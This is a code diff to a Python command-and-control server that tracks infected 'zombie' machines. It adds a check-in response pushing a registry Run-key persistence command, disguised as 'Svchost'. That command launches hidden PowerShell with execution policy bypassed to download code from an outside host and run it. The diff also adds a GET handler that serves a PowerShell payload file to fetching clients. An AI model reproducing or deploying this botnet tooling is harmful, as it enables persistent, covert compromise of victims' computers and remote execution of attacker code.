@@ -23,11 +23,11 @@ def process_zombie_checkin(json_object, public_ip):
 	username = data['username']
 	clm = data['clm']
 	json_response = '{}'
-	# If zombie is not registered, create it
+	# If zombie is not registered, create it and send command to install persistence
 	# else update check in time
 	if not any(z.uuid == uuid for z in zombies):
 		zombies.append(Zombie(uuid, hostname, username, public_ip, clm))
-		json_response = '{"command":" "}'
+		json_response = '{"command":"reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Svchost /t REG_SZ /d \'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c \"$command = iwr -Uri https://220.ip-54-37-16.eu/ -Method GET  -UseBasicParsing; iex $command\"\'"}'
 
 	else:
 		z = next((z for z in zombies if z.uuid == uuid), None)
@@ -76,6 +76,28 @@ class PostHandler(BaseHTTPRequestHandler):
 		# buffer so that deleting the wrapper doesn't close
 		# the socket, which is still being used by the server.
 		out.detach()
+
+
+	def do_GET(self):
+		self.send_response(200)
+		self.send_header('Content-Type',
+				'text/plain; charset=utf-8')
+		self.end_headers()
+
+		out = io.TextIOWrapper(
+			self.wfile,
+			encoding='utf-8',
+ 			line_buffering=False,
+			write_through=True,
+		)
+		f = open("/opt/aldebaran/darpa/oneline.ps1","r")
+		out.write(str(f.read()))
+		# Disconnect our encoding wrapper from the underlying
+		# buffer so that deleting the wrapper doesn't close
+		# the socket, which is still being used by the server.
+		out.detach()
+
+
 
 def start():
 	from http.server import HTTPServer, BaseHTTPRequestHandler
